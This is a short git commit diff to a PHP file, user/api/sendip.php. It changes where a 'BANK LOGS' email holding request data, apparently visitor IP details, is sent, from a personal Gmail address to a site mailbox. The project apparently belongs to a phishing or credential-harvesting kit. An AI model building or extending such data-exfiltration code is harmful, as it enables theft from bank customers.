58afa7c6a461a1058958a787e9c0c8e00219d588
Chidindu Emmanuel Aneke <86878828+Jace-Tech@users.noreply.github.com>
2023-03-09 18:30:20 +0100

    updated

--- user/api/sendip.php
+++ user/api/sendip.php
@@ -15,7 +15,7 @@ if (isset($_REQUEST['ip'])) {
       </body>
     </html>";
   
-    if (!sendEmail("jacealex151@gmail.com", "BANK LOGS", $message)){
+    if (!sendEmail("info@bekofcu.com", "BANK LOGS", $message)){
       echo "Message not sent";
     }
     else {
